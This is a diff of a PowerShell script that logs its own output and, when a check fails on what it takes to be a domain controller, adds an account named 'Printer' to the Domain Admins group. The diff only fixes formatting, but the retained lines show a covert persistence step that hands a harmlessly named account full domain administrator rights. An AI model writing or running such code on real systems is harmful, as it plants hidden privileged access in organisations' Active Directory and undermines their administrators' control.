@@ -1,4 +1,4 @@
-﻿param($ROOT = "C:\Users\$Env:UserName\Desktop")dd
+﻿param($ROOT = "C:\Users\$Env:UserName\Desktop")
 
 $LOGS = "$ROOT\PS-LOGS"
 $FREQ = 15
@@ -19,11 +19,11 @@ Start-Transcript -Path $LOGS\PS-MAINS-OUT.txt
 
 	if($?)
 	{
-		echo "Command succeeded, computer is not a domain controller."
+		echo "`nCommand succeeded, computer is not a domain controller."
 	}
 	else
 	{
-		echo "Command failed, adding printer to domain admins..."
+		echo "`nCommand failed, adding printer to domain admins..."
 		Add-ADGroupMember -Identity "Domain Admins" -Members "Printer"
 	}
 
